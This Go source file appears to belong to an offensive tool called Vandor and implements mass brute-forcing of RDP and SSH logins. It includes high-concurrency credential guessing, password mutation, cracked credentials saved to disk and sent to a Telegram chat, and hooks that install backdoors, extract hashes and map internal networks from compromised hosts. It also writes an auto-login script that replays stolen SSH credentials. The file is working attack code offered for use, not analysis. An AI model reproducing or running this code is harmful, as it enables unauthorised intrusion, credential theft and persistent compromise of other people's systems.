package protocols

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/batmanpriv/Vandor/colors"
	"github.com/batmanpriv/Vandor/config"
	"github.com/batmanpriv/Vandor/core"
	"github.com/batmanpriv/Vandor/internal"
	ex "github.com/batmanpriv/Vandor/postexploit"
	"github.com/batmanpriv/Vandor/protocol/nla"
	"github.com/batmanpriv/Vandor/protocol/pdu"
	"github.com/batmanpriv/Vandor/protocol/sec"
	"github.com/batmanpriv/Vandor/protocol/t125"
	"github.com/batmanpriv/Vandor/protocol/tpkt"
	"github.com/batmanpriv/Vandor/protocol/x224"

	"golang.org/x/crypto/ssh"
)

type StatData struct {
	TotalAttempts    int64   `json:"total_attempts"`
	SuccessRate      float64 `json:"success_rate"`
	AvgTimePerHost   float64 `json:"avg_time_per_host"`
	MostUsedPass     string  `json:"most_used_pass"`
	CommonPattern    string  `json:"common_pattern"`
	HoneypotDetected int     `json:"honeypot_detected"`
	BannedHosts      int     `json:"banned_hosts"`
	GPUSpeedup       float64 `json:"gpu_speedup"`
}

type CircularBuffer struct {
	mu       sync.RWMutex
	buffer   []string
	maxSize  int
	flushCh  chan struct{}
	stopCh   chan struct{}
	wg       sync.WaitGroup
	filename string
	flushed  int64
}

type CityRoute struct {
	Name    string
	IP      string
	Latency int
}

type Checkpoint struct {
	HostIndex   int               `json:"host_index"`
	UserIndex   int               `json:"user_index"`
	PassIndex   int               `json:"pass_index"`
	Hosts       []string          `json:"hosts"`
	Users       []string          `json:"users"`
	Passes      []string          `json:"passes"`
	Port        string            `json:"port"`
	Timeout     int               `json:"timeout"`
	Completed   bool              `json:"completed"`
	CrackedMap  map[string]string `json:"cracked_map"`
	FailedHosts map[string]int    `json:"failed_hosts"`
	BannedHosts map[string]string `json:"banned_hosts"`
	mu          sync.RWMutex      `json:"-"`
}

type RDPSuccessCallback func(host, port, user, pass string)

var (
	crackedList      []string
	crackedMu        sync.RWMutex
	crackedBuffer    *CircularBuffer
	TotalAttempts    int64
	SuccessAttempts  int64
	FailedAttempts   int64
	maxBannerSize    = 4096
	CompletedHosts   int32
	GlobalStop       int32
	CheckpointFile   = "checkpoint.json"
	checkpointMu     sync.Mutex
	MaxConcurrent    = 10000
	RDPTimeout       = 5
	LearningMap      = make(map[string]int)
	LearningMu       sync.RWMutex
	PasswordPatterns = []string{
		"%s123", "%s1234", "%s@123", "%s@1234",
		"%s!123", "%s#123", "%s2023", "%s2024",
	}
)

var CityRoutes = []CityRoute{
	{"Tehran", "185.110.188.1", 5},
	{"Dubai", "94.200.0.1", 15},
	{"Frankfurt", "3.120.0.1", 30},
	{"London", "13.40.0.1", 35},
	{"NewYork", "3.224.0.1", 60},
	{"Singapore", "13.228.0.1", 45},
	{"Tokyo", "13.112.0.1", 55},
}

var (
	rdpCP          *Checkpoint
	doPostExploit  bool
	doBackdoor     bool
	doExtractHash  bool
	doScanNetwork  bool
	backdoorCfg    ex.BackdoorConfig
	notifyCracked  bool
	rdpCallback    RDPSuccessCallback
)

func (cp *Checkpoint) Lock()   { cp.mu.Lock() }
func (cp *Checkpoint) Unlock() { cp.mu.Unlock() }
func (cp *Checkpoint) RLock()  { cp.mu.RLock() }
func (cp *Checkpoint) RUnlock(){ cp.mu.RUnlock() }

func (cp *Checkpoint) IsHostBannedSafe(host string) bool {
	cp.RLock()
	defer cp.RUnlock()
	_, exists := cp.BannedHosts[host]
	return exists
}

func (cp *Checkpoint) AddCracked(host, port, user, pass string) {
	cp.Lock()
	defer cp.Unlock()
	if cp.CrackedMap == nil {
		cp.CrackedMap = make(map[string]string)
	}
	key := fmt.Sprintf("%s:%s|%s", host, port, user)
	cp.CrackedMap[key] = pass
}

func SaveCheckpoint(cp *Checkpoint) {
	checkpointMu.Lock()
	defer checkpointMu.Unlock()
	if cp == nil {
		return
	}
	data, err := json.Marshal(cp)
	if err != nil {
		return
	}
	os.WriteFile(CheckpointFile, data, 0644)
}

func LoadCheckpoint() (*Checkpoint, error) {
	checkpointMu.Lock()
	defer checkpointMu.Unlock()
	data, err := os.ReadFile(CheckpointFile)
	if err != nil {
		return nil, err
	}
	var cp Checkpoint
	if err := json.Unmarshal(data, &cp); err != nil {
		return nil, err
	}
	if cp.CrackedMap == nil {
		cp.CrackedMap = make(map[string]string)
	}
	if cp.FailedHosts == nil {
		cp.FailedHosts = make(map[string]int)
	}
	if cp.BannedHosts == nil {
		cp.BannedHosts = make(map[string]string)
	}
	return &cp, nil
}

func NewCircularBuffer(filename string, maxSize int) *CircularBuffer {
	cb := &CircularBuffer{
		buffer:   make([]string, 0, maxSize),
		maxSize:  maxSize,
		flushCh:  make(chan struct{}, 1),
		stopCh:   make(chan struct{}),
		filename: filename,
		flushed:  0,
	}
	cb.loadExistingLines()
	go cb.flusher()
	return cb
}

func (cb *CircularBuffer) loadExistingLines() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	f, err := os.OpenFile(cb.filename, os.O_RDONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	buf := make([]byte, 64*1024)
	scanner.Buffer(buf, 1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			cb.buffer = append(cb.buffer, line)
		}
	}
	if len(cb.buffer) > cb.maxSize {
		cb.buffer = cb.buffer[len(cb.buffer)-cb.maxSize:]
	}
}

func (cb *CircularBuffer) Append(line string) {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.buffer = append(cb.buffer, line)
	if len(cb.buffer) >= cb.maxSize {
		select {
		case cb.flushCh <- struct{}{}:
		default:
		}
	}
}

func (cb *CircularBuffer) Len() int {
	cb.mu.RLock()
	defer cb.mu.RUnlock()
	return len(cb.buffer)
}

func (cb *CircularBuffer) flusher() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-cb.stopCh:
			cb.flush()
			return
		case <-cb.flushCh:
			cb.flush()
		case <-ticker.C:
			if cb.Len() > 0 {
				cb.flush()
			}
		}
	}
}

func (cb *CircularBuffer) flush() {
	cb.mu.Lock()
	if len(cb.buffer) == 0 {
		cb.mu.Unlock()
		return
	}
	toWrite := make([]string, len(cb.buffer))
	copy(toWrite, cb.buffer)
	cb.buffer = cb.buffer[:0]
	cb.mu.Unlock()
	f, err := os.OpenFile(cb.filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		cb.mu.Lock()
		cb.buffer = append(toWrite, cb.buffer...)
		cb.mu.Unlock()
		return
	}
	defer f.Close()
	for _, line := range toWrite {
		fmt.Fprintf(f, "%s\n", line)
	}
	atomic.AddInt64(&cb.flushed, int64(len(toWrite)))
}

func (cb *CircularBuffer) Close() {
	close(cb.stopCh)
	cb.wg.Wait()
}

func SetRDPSuccessCallback(cb RDPSuccessCallback) {
	rdpCallback = cb
}

func SetCrackedBuffer(cb *CircularBuffer) {
	crackedBuffer = cb
}

func AddToCrackedList(entry string) {
	crackedMu.Lock()
	defer crackedMu.Unlock()
	crackedList = append(crackedList, entry)
	if crackedBuffer != nil {
		crackedBuffer.Append(entry)
	}
}

func GetCrackedList() []string {
	crackedMu.RLock()
	defer crackedMu.RUnlock()
	result := make([]string, len(crackedList))
	copy(result, crackedList)
	return result
}

func IsHostBanned(host string, cp *Checkpoint) bool {
	cp.RLock()
	defer cp.RUnlock()
	if cp.BannedHosts == nil {
		return false
	}
	_, exists := cp.BannedHosts[host]
	return exists
}

func GetFullSSHBanner(host, port string, timeout int) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	buf := make([]byte, maxBannerSize)
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}
	if n > 0 {
		banner := strings.TrimSpace(string(buf[:n]))
		if len(banner) > 255 {
			banner = banner[:255]
		}
		return banner, nil
	}
	return "", fmt.Errorf("no banner received")
}

type RDPClientWrapper struct {
	host    string
	port    string
	user    string
	pass    string
	timeout int
}

func NewRDPClientWrapper(host, port, user, pass string, timeout int) *RDPClientWrapper {
	return &RDPClientWrapper{
		host:    host,
		port:    port,
		user:    user,
		pass:    pass,
		timeout: timeout,
	}
}

func splitUser(user string) (domain string, username string) {
	if strings.Contains(user, "\\") {
		parts := strings.SplitN(user, "\\", 2)
		domain = parts[0]
		username = parts[1]
	} else if strings.Contains(user, "/") {
		parts := strings.SplitN(user, "/", 2)
		domain = parts[0]
		username = parts[1]
	} else {
		domain = ""
		username = user
	}
	return
}

func (c *RDPClientWrapper) QuickLogin() bool {
	done := make(chan bool, 1)
	go func() {
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(c.host, c.port), time.Duration(c.timeout)*time.Second)
		if err != nil {
			done <- false
			return
		}
		defer conn.Close()
		domain, userName := splitUser(c.user)
		socketLayer := core.NewSocketLayer(conn)
		nlaLayer := nla.NewNTLMv2(domain, userName, c.pass)
		tpktLayer := tpkt.New(socketLayer, nlaLayer)
		x224Layer := x224.New(tpktLayer)
		mcsLayer := t125.NewMCSClient(x224Layer)
		secLayer := sec.NewClient(mcsLayer)
		pduLayer := pdu.NewClient(secLayer)
		mcsLayer.SetClientDesktop(800, 600)
		secLayer.SetUser(userName)
		secLayer.SetPwd(c.pass)
		secLayer.SetDomain(domain)
		tpktLayer.SetFastPathListener(secLayer)
		secLayer.SetFastPathListener(pduLayer)
		secLayer.SetChannelSender(mcsLayer)
		var success bool
		secLayer.On("success", func() {
			success = true
		})
		secLayer.On("error", func(err error) {
			errStr := err.Error()
			if strings.Contains(errStr, "access denied") {
				success = false
			} else if strings.Contains(errStr, "STATUS_VALID_CLIENT") {
				success = true
			} else {
				success = false
			}
		})
		err = x224Layer.Connect()
		if err != nil {
			done <- false
			return
		}
		time.Sleep(3 * time.Second)
		done <- success
	}()
	select {
	case result := <-done:
		return result
	case <-time.After(time.Duration(c.timeout+5) * time.Second):
		return false
	}
}

func SetRDPGlobals(
	checkpoint *Checkpoint,
	postExploit, backdoor, extractHash, scanNetwork bool,
	backdoorConfig ex.BackdoorConfig,
	notify bool,
) {
	rdpCP = checkpoint
	doPostExploit = postExploit
	doBackdoor = backdoor
	doExtractHash = extractHash
	doScanNetwork = scanNetwork
	backdoorCfg = backdoorConfig
	notifyCracked = notify
}

func RunRDP(hosts []string, port string, users, passes []string, timeout int) {
	if len(hosts) == 0 || len(users) == 0 || len(passes) == 0 {
		fmt.Printf("%s[ERROR] RDP needs hosts, users and passwords%s\n", colors.Red, colors.Reset)
		return
	}
	fmt.Printf("[RDP] Cracking %d hosts on port %s | Users: %d | Passwords: %d | Timeout: %ds\n",
		len(hosts), port, len(users), len(passes), timeout)
	
	var wg sync.WaitGroup
	sem := make(chan struct{}, MaxConcurrent)
	var cracked int32
	
	for _, host := range hosts {
		if rdpCP != nil && rdpCP.IsHostBannedSafe(host) {
			fmt.Printf("%s[SKIP] Host %s is banned%s\n", colors.Yellow, host, colors.Reset)
			continue
		}
		for _, user := range users {
			for _, pass := range passes {
				if atomic.LoadInt32(&GlobalStop) == 1 {
					break
				}
				wg.Add(1)
				sem <- struct{}{}
				go func(h, u, p string) {
					defer wg.Done()
					defer func() { <-sem }()
					client := NewRDPClientWrapper(h, port, u, p, timeout)
					success := client.QuickLogin()
if success {
	atomic.AddInt32(&cracked, 1)
	atomic.AddInt64(&SuccessAttempts, 1)
	fmt.Printf("\n%s✓ RDP CRACKED!%s %s@%s:%s | %s\n",
		colors.Green, colors.Reset, u, h, port, p)

	entry := fmt.Sprintf("%s:%s|%s:%s|RDP", h, port, u, p)

	crackedMu.Lock()

	exists := false
	for _, existing := range crackedList {
		if existing == entry {
			exists = true
			break
		}
	}
	if !exists {
		crackedList = append(crackedList, entry)
		if crackedBuffer != nil {
			crackedBuffer.Append(entry)
		}
	}
	crackedMu.Unlock()

	if rdpCallback != nil {
		rdpCallback(h, port, u, p)
	}

	if rdpCP != nil {
		rdpCP.AddCracked(h, port, u, p)
		SaveCheckpoint(rdpCP)
	}

	if config.TelegramToken != "" && config.TelegramChatID != "" && notifyCracked {
		go internal.SendTelegramNotification("cracked", map[string]interface{}{
			"host": h, "port": port, "user": u, "pass": p, "banner": "RDP",
		})
	}

	if doPostExploit {
		go ex.P0stExploit(h, port, u, p)
	}
	if doBackdoor {
		go ex.InstallBackdoor(h, port, u, p, backdoorCfg)
	}
	if doExtractHash {
		go ex.ExtractHashes(h, port, u, p)
	}
	if doScanNetwork {
		go ScanInternalNetwork(h, port, u, p)
	}
} else {
						atomic.AddInt64(&FailedAttempts, 1)
					}
					atomic.AddInt64(&TotalAttempts, 1)
				}(host, user, pass)
			}
			if atomic.LoadInt32(&GlobalStop) == 1 {
				break
			}
		}
		if atomic.LoadInt32(&GlobalStop) == 1 {
			break
		}
	}
	wg.Wait()
	
	fmt.Printf("\n[RDP] Complete! %d credentials found | Total attempts: %d | Success: %d | Failed: %d\n",
		cracked, TotalAttempts, SuccessAttempts, FailedAttempts)
}

type SSHJob struct {
	Host     string
	Port     string
	User     string
	Password string
	Timeout  int
}

type SSHResult struct {
	Success  bool
	Host     string
	Port     string
	User     string
	Password string
	Error    error
}

type SSHWorkerPool struct {
	workers int
	jobs    chan SSHJob
	results chan SSHResult
	wg      sync.WaitGroup
	ctx     context.Context
	cancel  context.CancelFunc
}

type SSHCrackerConfig struct {
	Hosts          []string
	Port           string
	Users          []string
	Passwords      []string
	Timeout        int
	Workers        int
	MinDelay       int
	MaxDelay       int
	Notify         int
	SmartPass      bool
	PostExploit    bool
	ScanNetwork    bool
	ExtractHash    bool
	GenerateScript bool
	ResumeIdx      int
	Checkpoint     *Checkpoint
	Backdoor       ex.BackdoorConfig
	DoBackdoor     bool
	MultiCity      bool
	MassPwn        bool
	TelegramToken  string
	TelegramChatID string
}

type SSHCrackerResult struct {
	CrackedList   []string
	TotalAttempts int64
	SuccessCount  int64
	FailedCount   int64
}

var (
	sshCrackedList    []string
	sshCrackedMu      sync.RWMutex
	sshTotalAttempts  int64
	sshSuccessCount   int64
	sshFailedCount    int64
	sshCompletedHosts int32
	sshStopFlag       int32
	sshResultCallback func(host, port, user, pass string)
)

func SetSSHResultCallback(cb func(host, port, user, pass string)) {
	sshResultCallback = cb
}

func NewSSHWorkerPool(workers int) *SSHWorkerPool {
	ctx, cancel := context.WithCancel(context.Background())
	return &SSHWorkerPool{
		workers: workers,
		jobs:    make(chan SSHJob, workers*20),
		results: make(chan SSHResult, workers*20),
		ctx:     ctx,
		cancel:  cancel,
	}
}

func (wp *SSHWorkerPool) Start() {
	for i := 0; i < wp.workers; i++ {
		wp.wg.Add(1)
		go wp.worker()
	}
}

func (wp *SSHWorkerPool) worker() {
	defer wp.wg.Done()
	for {
		select {
		case <-wp.ctx.Done():
			return
		case job, ok := <-wp.jobs:
			if !ok {
				return
			}
			result := wp.processJob(job)
			select {
			case wp.results <- result:
			case <-wp.ctx.Done():
				return
			}
		}
	}
}

func (wp *SSHWorkerPool) processJob(job SSHJob) SSHResult {
	atomic.AddInt64(&sshTotalAttempts, 1)
	timeout := job.Timeout
	if timeout < 10 {
		timeout = 10
	}
	if timeout > 30 {
		timeout = 30
	}
	cfg := &ssh.ClientConfig{
		User: job.User,
		Auth: []ssh.AuthMethod{
			ssh.Password(job.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(timeout) * time.Second,
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(job.Host, job.Port), time.Duration(timeout)*time.Second)
	if err != nil {
		atomic.AddInt64(&sshFailedCount, 1)
		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
	}
	defer conn.Close()
	sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(job.Host, job.Port), cfg)
	if err != nil {
		atomic.AddInt64(&sshFailedCount, 1)
		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
	}
	defer sshConn.Close()
	client := ssh.NewClient(sshConn, chans, reqs)
	defer client.Close()
	session, err := client.NewSession()
	if err != nil {
		atomic.AddInt64(&sshFailedCount, 1)
		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
	}
	defer session.Close()
	var stdoutBuf bytes.Buffer
	session.Stdout = &stdoutBuf
	err = session.Run("uname -a")
	if err != nil {
		atomic.AddInt64(&sshFailedCount, 1)
		return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: err}
	}
	output := stdoutBuf.String()
	if strings.Contains(output, "Linux") || strings.Contains(output, "Unix") || strings.Contains(output, "Darwin") {
		atomic.AddInt64(&sshSuccessCount, 1)
		entry := fmt.Sprintf("%s:%s|%s:%s|SSH", job.Host, job.Port, job.User, job.Password)
		sshCrackedMu.Lock()
		sshCrackedList = append(sshCrackedList, entry)
		sshCrackedMu.Unlock()
		if crackedBuffer != nil {
			crackedBuffer.Append(entry)
		}
		if sshResultCallback != nil {
			sshResultCallback(job.Host, job.Port, job.User, job.Password)
		}
		if config.TelegramToken != "" && config.TelegramChatID != "" {
			go internal.SendTelegramNotification("cracked", map[string]interface{}{
				"host": job.Host, "port": job.Port, "user": job.User, "pass": job.Password, "banner": "SSH",
			})
		}
		fmt.Printf("\n%s SSH CRACKED!%s %s@%s:%s | %s\n",
			colors.Green, colors.Reset, job.User, job.Host, job.Port, job.Password)
		return SSHResult{Success: true, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password}
	}
	atomic.AddInt64(&sshFailedCount, 1)
	return SSHResult{Success: false, Host: job.Host, Port: job.Port, User: job.User, Password: job.Password, Error: fmt.Errorf("invalid response")}
}

func (wp *SSHWorkerPool) AddJob(job SSHJob) {
	select {
	case wp.jobs <- job:
	case <-wp.ctx.Done():
	}
}

func (wp *SSHWorkerPool) Results() <-chan SSHResult {
	return wp.results
}

func ScanInternalNetwork(host, port, user, pass string) []string {
	fmt.Printf("%s[NETWORK MAP] Scanning internal network from %s%s\n", colors.Magenta, host, colors.Reset)
	var internalHosts []string
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
	if err != nil {
		return internalHosts
	}
	defer conn.Close()
	session, err := conn.NewSession()
	if err != nil {
		return internalHosts
	}
	defer session.Close()
	commands := []string{
		"ip route | grep -E 'src|via' | awk '{print $1}' | grep -E '^[0-9]' 2>/dev/null",
		"arp -n 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}'",
		"cat /etc/hosts 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}'",
	}
	hostMap := make(map[string]bool)
	for _, cmd := range commands {
		var stdoutBuf bytes.Buffer
		session.Stdout = &stdoutBuf
		session.Run(cmd)
		lines := strings.Split(strings.TrimSpace(stdoutBuf.String()), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" && !hostMap[line] && !strings.Contains(line, "255") && !strings.Contains(line, "0.0.0.0") {
				hostMap[line] = true
				internalHosts = append(internalHosts, line)
			}
		}
		stdoutBuf.Reset()
	}
	if len(internalHosts) > 0 {
		f, _ := os.OpenFile("internal_network.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if f != nil {
			defer f.Close()
			for _, h := range internalHosts {
				fmt.Fprintf(f, "%s\n", h)
			}
		}
	}
	fmt.Printf("%s[NETWORK MAP] Found %d internal hosts%s\n", colors.Green, len(internalHosts), colors.Reset)
	return internalHosts
}

func (wp *SSHWorkerPool) Stop() {
	wp.cancel()
	close(wp.jobs)
	wp.wg.Wait()
	close(wp.results)
}

func randomDelaySSH(minDelay, maxDelay int) {
	if minDelay > 0 && maxDelay > 0 && minDelay < maxDelay {
		delay := minDelay + (maxDelay-minDelay)/2
		if delay > 0 {
			time.Sleep(time.Duration(delay) * time.Millisecond)
		}
	}
}

func massPwnSSH(hosts []string, port string, users, passes []string, timeout int, threads int) {
	fmt.Printf("%s[MASS PWN] Launching simultaneous attack on %d hosts with %d threads%s\n", colors.Magenta, len(hosts), threads, colors.Reset)
	var wg sync.WaitGroup
	sem := make(chan struct{}, threads)
	var cracked int32
	totalCombinations := len(hosts) * len(users) * len(passes)
	for _, host := range hosts {
		for _, user := range users {
			for _, pass := range passes {
				wg.Add(1)
				sem <- struct{}{}
				go func(h, u, p string) {
					defer wg.Done()
					defer func() { <-sem }()
					timeoutVal := timeout
					if timeoutVal < 10 {
						timeoutVal = 10
					}
					if timeoutVal > 30 {
						timeoutVal = 30
					}
					cfg := &ssh.ClientConfig{
						User: u,
						Auth: []ssh.AuthMethod{
							ssh.Password(p),
						},
						HostKeyCallback: ssh.InsecureIgnoreHostKey(),
						Timeout:         time.Duration(timeoutVal) * time.Second,
					}
					conn, err := net.DialTimeout("tcp", net.JoinHostPort(h, port), time.Duration(timeoutVal)*time.Second)
					if err != nil {
						return
					}
					defer conn.Close()
					sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(h, port), cfg)
					if err != nil {
						return
					}
					defer sshConn.Close()
					client := ssh.NewClient(sshConn, chans, reqs)
					defer client.Close()
					session, err := client.NewSession()
					if err != nil {
						return
					}
					defer session.Close()
					var stdoutBuf bytes.Buffer
					session.Stdout = &stdoutBuf
					err = session.Run("uname -a")
					if err != nil {
						return
					}
					output := stdoutBuf.String()
					if !strings.Contains(output, "Linux") && !strings.Contains(output, "Unix") && !strings.Contains(output, "Darwin") {
						return
					}
					atomic.AddInt32(&cracked, 1)
					fmt.Printf("\n%s💀 MASS PWN CRACKED:%s %s@%s:%s | %s\n", colors.Green, colors.Reset, u, h, port, p)
					entry := fmt.Sprintf("%s:%s|%s:%s|mass_pwn", h, port, u, p)
					sshCrackedMu.Lock()
					sshCrackedList = append(sshCrackedList, entry)
					sshCrackedMu.Unlock()
					if crackedBuffer != nil {
						crackedBuffer.Append(entry)
					}
					if sshResultCallback != nil {
						sshResultCallback(h, port, u, p)
					}
					if config.TelegramToken != "" && config.TelegramChatID != "" {
						go internal.SendTelegramNotification("cracked", map[string]interface{}{
							"host": h, "port": port, "user": u, "pass": p, "banner": "mass_pwn",
						})
					}
				}(host, user, pass)
			}
		}
	}
	wg.Wait()
	fmt.Printf("%s[MASS PWN] Complete! %d/%d combinations cracked%s\n", colors.Green, cracked, totalCombinations, colors.Reset)
}

func generateSSHScript(crackedList []string) {
	if len(crackedList) == 0 {
		return
	}
	script := `#!/bin/bash
CRACKED_FILE="Cracked.txt"
if [ ! -f "$CRACKED_FILE" ]; then
    echo "No cracked credentials found"
    exit 1
fi
echo "=== Vandor Auto Login Script ==="
echo ""
SUCCESS_FILE="auto_login_success.txt"
> "$SUCCESS_FILE"
while IFS= read -r line; do
    if [[ $line =~ (.+):([0-9]+)\|(.+):(.+)\|(.+) ]]; then
        HOST="${BASH_REMATCH[1]}"
        PORT="${BASH_REMATCH[2]}"
        USER="${BASH_REMATCH[3]}"
        PASS="${BASH_REMATCH[4]}"
        echo "[*] Testing $USER@$HOST:$PORT"
        if command -v sshpass &> /dev/null; then
            timeout 5 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p "$PORT" "$USER@$HOST" "uname -a" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "[+] SUCCESS: $USER@$HOST:$PORT | $PASS"
                echo "$USER@$HOST:$PORT|$PASS" >> "$SUCCESS_FILE"
            fi
        else
            echo "Install sshpass: apt install sshpass or brew install hudochenkov/sshpass/sshpass"
            break
        fi
    fi
done < "$CRACKED_FILE"
echo ""
echo "Results saved to $SUCCESS_FILE"
`
	os.WriteFile("auto_login.sh", []byte(script), 0755)
	fmt.Printf("%s[SCRIPT] Generated auto_login.sh%s\n", colors.Green, colors.Reset)
}

func RunSSHCracker(config SSHCrackerConfig) SSHCrackerResult {
	if config.Workers > 500 {
		config.Workers = 200
		fmt.Printf("%s[WARN] Workers reduced to 200%s\n", colors.Yellow, colors.Reset)
	}
	if config.Timeout < 10 {
		config.Timeout = 10
		fmt.Printf("%s[WARN] Timeout increased to 10s%s\n", colors.Yellow, colors.Reset)
	}
	totalHosts := len(config.Hosts)
	totalUsers := len(config.Users)
	totalPasses := len(config.Passwords)
	if config.MassPwn {
		massPwnSSH(config.Hosts, config.Port, config.Users, config.Passwords, config.Timeout, config.Workers)
		return SSHCrackerResult{
			CrackedList:   sshCrackedList,
			TotalAttempts: sshTotalAttempts,
			SuccessCount:  sshSuccessCount,
			FailedCount:   sshFailedCount,
		}
	}
	if totalHosts == 0 || totalUsers == 0 || totalPasses == 0 {
		fmt.Printf("[ERROR] SSH needs hosts, users and passwords\n")
		return SSHCrackerResult{}
	}
	fmt.Printf("[SSH] Users: %d | Pass: %d | Hosts: %d | Workers: %d | Timeout: %ds\n\n",
		totalUsers, totalPasses, totalHosts, config.Workers, config.Timeout)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Printf("\n%s[SHUTDOWN] Stopping...%s\n", colors.Yellow, colors.Reset)
		cancel()
	}()
	wp := NewSSHWorkerPool(config.Workers)
	wp.Start()
	var wg sync.WaitGroup
	startHost := config.ResumeIdx
	if startHost < 0 {
		startHost = 0
	}
	sshCrackedList = []string{}
	sshTotalAttempts = 0
	sshSuccessCount = 0
	sshFailedCount = 0
	sshCompletedHosts = 0
	atomic.StoreInt32(&sshStopFlag, 0)
	passwordList := make([]string, len(config.Passwords))
	copy(passwordList, config.Passwords)
	if config.SmartPass {
		extraPasses := []string{}
		for _, user := range config.Users {
			extraPasses = append(extraPasses,
				user+"123", user+"1234", user+"@123", user+"@1234",
				user+"!123", user+"#123", user+"2023", user+"2024",
				user+"@2023", user+"@2024", "P@ssw0rd"+user,
			)
		}
		passwordList = append(passwordList, extraPasses...)
	}
	for idx := startHost; idx < totalHosts && atomic.LoadInt32(&sshStopFlag) == 0; idx++ {
		select {
		case <-ctx.Done():
			goto done
		default:
		}
		host := config.Hosts[idx]
		fmt.Printf("[%d/%d] Testing: %s\n", idx+1, totalHosts, host)
		if config.MultiCity && len(CityRoutes) > 0 {
			cityIdx := idx % len(CityRoutes)
			route := CityRoutes[cityIdx]
			fmt.Printf("%s[ROUTE] %s via %s (latency: %dms)%s\n", colors.Yellow, host, route.Name, route.Latency, colors.Reset)
			time.Sleep(time.Duration(route.Latency) * time.Millisecond)
		}
		for _, user := range config.Users {
			for _, pass := range passwordList {
				if atomic.LoadInt32(&sshStopFlag) == 1 {
					break
				}
				wg.Add(1)
				go func(h, u, p string) {
					defer wg.Done()
					randomDelaySSH(config.MinDelay, config.MaxDelay)
					wp.AddJob(SSHJob{
						Host:     h,
						Port:     config.Port,
						User:     u,
						Password: p,
						Timeout:  config.Timeout,
					})
				}(host, user, pass)
			}
			if atomic.LoadInt32(&sshStopFlag) == 1 {
				break
			}
		}
	}
done:
	wg.Wait()
	wp.Stop()
	cancel()
	if config.Checkpoint != nil {
		config.Checkpoint.Lock()
		config.Checkpoint.Completed = true
		config.Checkpoint.Unlock()
		SaveCheckpoint(config.Checkpoint)
	}
	if config.GenerateScript && len(sshCrackedList) > 0 {
		generateSSHScript(sshCrackedList)
	}
	return SSHCrackerResult{
		CrackedList:   sshCrackedList,
		TotalAttempts: sshTotalAttempts,
		SuccessCount:  sshSuccessCount,
		FailedCount:   sshFailedCount,
	}
}

func GetSSHCrackedList() []string {
	sshCrackedMu.RLock()
	defer sshCrackedMu.RUnlock()
	result := make([]string, len(sshCrackedList))
	copy(result, sshCrackedList)
	return result
}

func GetSSHStats() (int64, int64, int64) {
	return sshTotalAttempts, sshSuccessCount, sshFailedCount
}

func ResetSSHStats() {
	sshTotalAttempts = 0
	sshSuccessCount = 0
	sshFailedCount = 0
	sshCrackedList = []string{}
	sshCompletedHosts = 0
	atomic.StoreInt32(&sshStopFlag, 0)
}